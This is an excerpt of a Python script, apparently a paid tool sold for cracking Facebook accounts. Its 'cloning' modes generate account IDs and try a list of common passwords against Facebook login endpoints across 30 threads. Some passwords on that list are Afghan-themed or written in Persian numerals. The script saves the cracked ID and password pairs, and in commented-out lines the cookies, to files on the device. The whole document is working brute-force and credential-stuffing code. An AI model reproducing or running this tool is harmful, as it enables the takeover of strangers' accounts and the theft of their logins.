...
\033[1;37m SSSSS  AA   AA LLLLLLL AA   AA RR   RR
\033[1;31m----------------------------------------------
\033[1;31m❲\033[1;36m~\033[1;31m❳\033[1;37m Author     :  SaLar KhAno
\033[1;31m❲\033[1;36m~\033[1;31m❳\033[1;37m Facebook   :  PriNce SaLar
\033[1;31m❲\033[1;36m~\033[1;31m❳\033[1;37m Tool       :  PAID
\033[1;31m❲\033[1;36m~\033[1;31m❳\033[1;37m Version    :  1.2
\033[1;31m----------------------------------------------""")
def linex():
	print('\033[1;31m----------------------------------------------')
def clear():
...
def menu():
			clear()
		#	linex()
			print('\033[1;31m❲\033[1;36m~\033[1;31m❳\033[1;37m [1] File cloning\n\033[1;31m❲\033[1;36m~\033[1;31m❳\033[1;37m [2] Random cloning \n\033[1;31m❲\033[1;36m~\033[1;31m❳\033[1;37m [3] join whatsap group \n\033[1;31m❲\033[1;36m~\033[1;31m❳\033[1;37m [0] Exit menu')
			linex()
		...
		#	os.system('xdg-open)
			if xd in ['1','01']:
				...
				if cx in ['y','Y','yes','Yes','1']:
					...
					pcp.append('n')
				clear()
				print('\033[1;31m❲\033[1;36m~\033[1;31m❳\033[1;37m [1] Method M1 \n\033[1;31m❲\033[1;36m~\033[1;31m❳\033[1;37m [2] Method M2')
				linex()
				mth = input(' Choose : ')
				with tred(max_workers=30) as crack_submit:
					clear()
					total_ids = str(len(fo))
					print('\033[1;31m❲\033[1;36m~\033[1;31m❳\033[1;37m Total account ids : \033[1;32m'+total_ids+f' ')
					print('\033[1;31m❲\033[1;36m~\033[1;31m❳\033[1;37mThe process is running in the background')
					linex()
					for user in fo:
...
def pak():
		user=[]
		clear()
		print('\033[1;35m Code example: 070,075,078,077')
		...
		with tred(max_workers=30) as zain:
			...
			for psx in user:
				ids = code+psx
				passlist = [psx,ids,'100200','10002000','500600','500500','50005000','khan123456','600700','۱٠٠۲٠٠','۱٠٠٠۲٠٠٠','۵٠٠۵٠٠','۵٠٠٠۵٠٠٠','۵٠٠۶٠٠','۱۲۳۴۵۶','۱۲۳۴۵۶۷','۱۲۳۴۵۶۷۸','۱۲۳۴۵۶۷۸۹','afghan123','afghan1234','afghan12345','afghanistan','afghanistan12','afghanistan123','Afghanistan12','Afghanistan123','Afghan500500','khan12','khan khan','۷٠٠٠۸٠٠٠','janjan']
...
def rd1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [SALAR-XD] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        #open('/sdcard/SALAR-R-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/SALAR-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(ids))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        #print('\r\r\x1b[1;31m [SALAR-CP] '+str(ids)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SALAR-R-CP.txt','a').write(str(ids)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def api(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [SALAR-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        sys.stdout.write('\r\r\033[1;31m [SALAR-M2] %s|\033[1;31mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [SALAR-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api2(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [SALAR-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [SALAR-OK] %s | %s'%(ids,pas))
                                open('/sdcard/SALAR-file-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                #open('/sdcard/SALAR-file-coki-OK.txt', 'a').write(ids+' | '+pas+' | '+kuki+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        ##########print('\r\r\x1b[38;5;208m [ZAIN-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SALAR-file-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
